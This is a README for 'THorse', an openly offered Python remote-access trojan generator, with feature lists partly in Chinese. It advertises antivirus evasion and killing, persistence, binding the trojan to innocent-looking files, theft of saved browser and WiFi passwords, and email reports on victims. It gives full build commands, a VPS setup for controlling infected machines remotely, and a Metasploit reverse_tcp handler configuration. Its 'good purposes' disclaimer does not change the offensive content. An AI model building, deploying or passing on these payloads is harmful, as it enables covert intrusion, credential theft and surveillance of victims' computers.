<h1 align="center">THorse</h1>
<p align="center">
    <a href="https://python.org">
    <img src="https://img.shields.io/badge/Python-3.7-green.svg">
  </a>
  <a href="https://github.com/PushpenderIndia/thorse/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/License-BSD%203-lightgrey.svg">
  </a>
  <a href="https://github.com/PushpenderIndia/thorse/releases">
    <img src="https://img.shields.io/badge/Release-1.7-blue.svg">
  </a>
    <a href="https://github.com/PushpenderIndia/thorse">
    <img src="https://img.shields.io/badge/Open%20Source-%E2%9D%A4-brightgreen.svg">
  </a>
</p>



<p align="center">
  Thorse这是一款用Python编写的RAT(Remote Administrator Trojan)，运行于Windows/Linux系统
</p>
              
                        This small python script can do really awesome work.

## Disclaimer
<p align="center">
  :computer: 该项目仅出于‘良好目的’和*个人使用*而创建。
</p>

本软件按“原样”提供，不提供任何形式的保证。使用本软件的风险由您自行承担。使用完全由最终用户负责。开发人员不承担任何责任，也不对本程序造成的任何误用或损害负责。

## Features
- [x] 运行于Windows/Linux操作系统
- [x] 通过电子邮件通知新的受害者
- [x] 检测不到
- [x] DOES 不需要 root 或管理员权限
- [x] 坚持
- [x] 通过电子邮件发送受害者 PC 屏幕的屏幕截图
- [x] 向攻击者提供完全的计量器访问权限
- [x] 不需要安装 metesploit 来创建木马
- [x] 创建具有零依赖项的可执行二进制文件
- [x] 创建尺寸更小的 ~ 5MB 有效负载，具有高级功能
- [x] 在编译之前混淆有效负载，从而绕过更多的防病毒软件
- [x] 生成的有效载荷使用 Base64 编码，因此对有效载荷进行逆向工程非常困难
- [x] 在受害者PC上杀死防病毒软件并尝试禁用Windows安全中心
- [x] 令人敬畏的彩色界面来生成有效载荷
- [x] 在攻击者方面：在创建有效负载时，脚本会自动检测缺失的依赖项并安装它们
- [x]能够将自定义图标添加到邪恶文件
- [x]**内置活页夹**，可以将可执行文件绑定到**任何文件**[.pdf、.txt、.exe等]，在前端运行合法文件，在后端运行恶意代码作为服务。
- [x] 检查系统上的**已在运行的实例**，如果找到正在运行的实例，则只执行合法文件[**多实例禁止**]。
- [x]攻击者可以使用 Linux 系统为 Windows/Linux 操作系统创建/编译，但只能使用 Windows 计算机创建/编译 Windows** 可执行文件
- [x] **从受害系统中检索已保存的密码**并将其发送给攻击者。

| Supported Retrives, Tries to Retrive Saved Passwords from : |
| ----------------------------------------------------------- |
| Chrome Browser |
| WiFi |
#### Note: Custom Stealer is Coded, does not relies on LaZagne

## Tested On
[![Kali)](https://www.google.com/s2/favicons?domain=https://www.kali.org/)](https://www.kali.org) **Kali Linux - ROLLING EDITION**

[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 10**

[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 8.1 - Pro**

[![Windows)](https://www.google.com/s2/favicons?domain=https://www.microsoft.com/en-in/windows/)](https://www.microsoft.com/en-in/windows/) **Windows 7 - Ultimate**


## Following is the limitations of meterpreter payload generated using metasploit:-
  * Have to run the Metasploit Listener before executing backdoor
  * Backdoor itself don't become persistence, we have to use the post exploitation modules in order to make backdoor persistence. 
    And post exploitation modules can only be used after successful exploitation.
  * Didn't Notify us whenever payload get executed on new system.
  
We all know how powerful the Meterpeter payload is but still the payload made from it is not satisfactory.

## Following are the features of this payload generator which will give you a good idea of this python script:-
  * Uses Windows registry to become persistence in windows.
  * Also manages to become persistence in linux system.
  * Payload can run on LINUX as well as WINDOWS.
  * Provide Full Access, as metasploit listener could be used as well as supports custom listener (You can Create Your Own Listener)
  * Sends Email Notification, when ever payload runs on new system, with complete system info.
  * Generates payload within 1 minute or ever less.
  * Supports all meterpreter post exploitation modules.
  * Payload Can be Created on Windows as well as Linux system.


## Prerequisite
- [x] Python 3.X
- [x] Few External Modules

## Please Note: 
In Windows, Please Specify/Set Pyinstaller path in `paygen.py` [**Line 14**]

Default Path is this : `PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")`

**Change it according to your system**

## How To Use in Linux
```bash
# Install dependencies 
$ Install latest python 3.x

# Navigate to the /opt directory (optional)
$ cd /opt/

# Clone this repository
$ git clone https://github.com/PushpenderIndia/thorse.git

# Go into the repository
$ cd thorse

# Installing dependencies
$ bash installer_linux.sh

# If you are getting any errors while executing installer_linux.sh, try to install using installer_linux.py
$ python3 installer_linux.py

$ chmod +x paygen.py
$ python3 paygen.py --help

# Making Payload/RAT
$ python3 paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path

# Making Payload/RAT with Custom AVKiller [By Default, Tons of Know AntiVirus is added in Kill_Targets]
$ python3 paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --kill_av AntiVirus.exe

# Making Payload/RAT with Custom Time to become persistence
$ python3 paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --persistence 10 

Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
```

## How To Use in VPS (Recommend)
```
# 1. Setup a VPS, You can buy Ubuntu VPS from any VPS Provider such as Digital Ocean, Linode, AWS, etc

# 2. Connect to your VPS Using SSH
$ ssh username@ip_address

# 3. Update Your Linux VPS
$ sudo apt update

# 4. Add Kali Linux Repository
$ sudo sh -c "echo 'deb https://http.kali.org/kali kali-rolling main non-free contrib' > /etc/apt/sources.list.d/kali.list"

# 5. Install gnupg package
$ sudo apt install gnupg

# 6. Add Kali Public Keys
$ wget 'https://archive.kali.org/archive-key.asc' && sudo apt-key add archive-key.asc

# 7. Update VPS
$ sudo apt update

# 8. Set Kali Priority
$ sudo sh -c "echo 'Package: *'>/etc/apt/preferences.d/kali.pref; echo 'Pin: release a=kali-rolling'>>/etc/apt/preferences.d/kali.pref; echo 'Pin-Priority: 50'>>/etc/apt/preferences.d/kali.pref"

# 9. Update VPS
$ sudo apt update

# 10. Install Metasploit Framework in VPS
$ sudo apt install -t kali-rolling metasploit-framework

# NOTE: Above Steps needs to be performed only for once 

# 11. Install pip3
$ sudo apt install python3-pip

# 12. Clone this repository
$ git clone https://github.com/PushpenderIndia/thorse.git

# 13. Go into the repository
$ cd thorse

# 14. Installing dependencies
$ bash installer_linux.sh

# 15. If you are getting any errors while executing installer_linux.sh, try to install using installer_linux.py
$ python3 installer_linux.py

$ 16. chmod +x paygen.py
$ python3 paygen.py --help

# Making Payload/RAT (If you want to Compile RAT for Windows, then Build RAT on Windows Machine & Use VPS for Controlling RAT Remotely)
$ python3 paygen.py --ip VPS_Public_IP_Address --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path

# Making Payload/RAT with Custom AVKiller [By Default, Tons of Know AntiVirus is added in Kill_Targets]
$ python3 paygen.py --ip VPS_Public_IP_Address --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --kill_av AntiVirus.exe

# Making Payload/RAT with Custom Time to become persistence
$ python3 paygen.py --ip VPS_Public_IP_Address --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --persistence 10 

Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
```

## How To Use in Windows
```bash
# Install dependencies 
$ Install latest python 3.x

# Clone this repository
$ git clone https://github.com/PushpenderIndia/thorse.git

# Go into the repository
$ cd thorse

# Installing dependencies
$ python -m pip install -r requirements.txt

# Open paygen.py in Text editor and Configure Line 15, set Pyinstaller path, Default Path is as follows :-
# PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe") 

# Getting Help Menu
$ python paygen.py --help

# Making Payload/RAT
$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -w -o output_file_name --icon icon_path

# Making Payload/RAT with Custom AVKiller [By Default, Tons of Know AntiVirus is added in Kill_Targets]
$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path --kill_av AntiVirus.exe

# Making Payload/RAT binded with legitimate file [Any file .exe, .pdf, .txt etc]
$ python paygen.py --ip 127.0.0.1 --port 8080 -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon/txt.ico --bind passwords.txt 

Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
```

## Note:- Evil File will be saved inside dist/ folder, inside technowhorse/ folder

## Establishing Connection Using Msfconsole 

* You Need to Install Metasploit-Framework on your system for establishing connection

* Recommended Settings, You can try to test it with any other payload in line 2
```
$ sudo msfconsole
msf3> use exploit/multi/handler
msf3> set payload python/meterpreter/reverse_tcp
msf3> set LHOST 192.168.43.221
msf3> set LPORT 443
msf3> run
```

## How to Update

* Run updater.py to Update Autmatically or Download the latest Zip from this GitHub repo
* Note: Git Must be Installed in order to use updater.py

## Available Arguments 
* Optional Arguments

| Short Hand  | Full Hand | Description |
| ----------  | --------- | ----------- |
| -h          | --help    | show this help message and exit |
| -k KILL_AV  |--kill_av KILL_AV | AntivirusKiller : Specify AV's .exe which need to be killed. Ex:- --kill_av cmd.exe |
| -t TIME_IN_SECONDS | --persistence TIME_PERSISTENT | Becoming Persistence After __ seconds. default=10 |
|  -w | --windows | Generate a Windows executable. |
|  -l | --linux   | Generate a Linux executable. |
| -b file.txt | --bind LEGITIMATE_FILE_PATH.pdf | AutoBinder : Specify Path of Legitimate file. [**Supported OS : Windows**] |
|  -s | --steal-password | Steal Saved Password from Victim Machine [**Supported OS : Windows**] |
|  -d | --debug | Run Virus on Foreground |
#### Note : Either **-w/--windows** or  **-l/--linux** must be specified 

* Required Arguments

| Short Hand  | Full Hand | Description |
| ----------  | --------- | ----------- |
|             | --icon ICON   | Specify Icon Path, Icon of Evil File [Note : Must Be .ico] |
|             | --ip IP_ADDRESS | Email address to send reports to. |
|             | --port PORT   | Port of the IP Address given in the --ip argument. |
| -e EMAIL    | --email EMAIL | Email address to send reports to. |
| -p PASSWORD | --password PASSWORD | Password for the email address given in the -e argument. |
| -o OUT      | --out OUT    | Output file name.|

## New Screenshots:


#### Getting Help
![](/img/1.version1.4.PNG)

#### Generating payload
![](/img/2.version1.4.PNG)

### Also Refer These Old Images

## ~Old Screenshots:

#### Getting Help
![](/img/1.help.png)

#### Running paygen.py Script
![](/img/2.running_script.png)

#### When RAT runs, it adds Registry to become persistence
![](/img/3.added_registry_for_persistence.png)

#### Makes copy of itself and saved it inside Roming
![](/img/4.rat_saved_roming.png)

#### Report sended by RAT
![](/img/5.report_from_rat.png)

#### Getting Notification From Victim PC
![](/img/6.getting_notification.png)

## Contributors:
Currently this repo is maintained by me (Pushpender Singh). But If you want to become contributor, then add some cool feature and make a pull request, I will review, and merge it this repo.

All contributor's pull request will be accepted if their pull request is worthy for this repo.

## TODO
- [ ] Add new features
- [ ] Contribute GUI 

## Removing TechNowHorse in Windows:

#### Method 1:

   * Go to start, type regedit and run the first program, this will open the registry editor.
   * Navigate to the following path Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run There should be an entry called winexplorer, right click this entry and select Delete.
   * Go to your user path > AppData > Roaming, you’ll see a file named “explorer.exe”, this is the RAT, right click > Delete.
   * Restart the System.

#### Method 2:
   * Run "RemoveTHorse.bat" in Infected System and then restart the PC to stop the current Running Evil File.

## Removing TechNowHorse in Linux:

   * Open Autostart file with any text editor,
     ****Autostart File Path: ~/.config/autostart/xinput.desktop****
   * Remove these 5 lines:
   
            [Desktop Entry]
            Type=Application
            X-GNOME-Autostart-enabled=true
            Name=Xinput
            Exec="destination_file_name"
        
   * Note: **destination_file_name** is that name of evil_file which you gave 
      to your TrojanHorse using -o parameter
   * Reboot your system and then delete the evil file stored this this below path
   * Destination Path, where TrojanHorse is stored : **~/.config/xnput**



## Contributors

- Dedicated Contributors List: [Contributors](CONTRIBUTORS.md)

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->

<table>
<tr>

<td align="center">
    <a href="https://github.com/PushpenderIndia">
        <kbd><img src="https://avatars3.githubusercontent.com/PushpenderIndia?size=400" width="100px;" alt=""/></kbd><br />
        <sub><b>Pushpender Singh</b></sub>
    </a><br />
    <a href="https://github.com/PushpenderIndia/thorse/commits?author=PushpenderIndia" title="Code"> :computer: </a> 
</td>

</tr>
</tr>
</table>

<!-- markdownlint-enable -->
<!-- prettier-ignore-end -->
<!-- ALL-CONTRIBUTORS-LIST:END -->

Contributions of any kind welcome!

>    NOTE: If you should be on the list of contributors but we forgot you, then do let us know!

## TODO List
* Suggestion your own feature : )
* GUI Development
* Bug Fix
* Add more browser password stealers
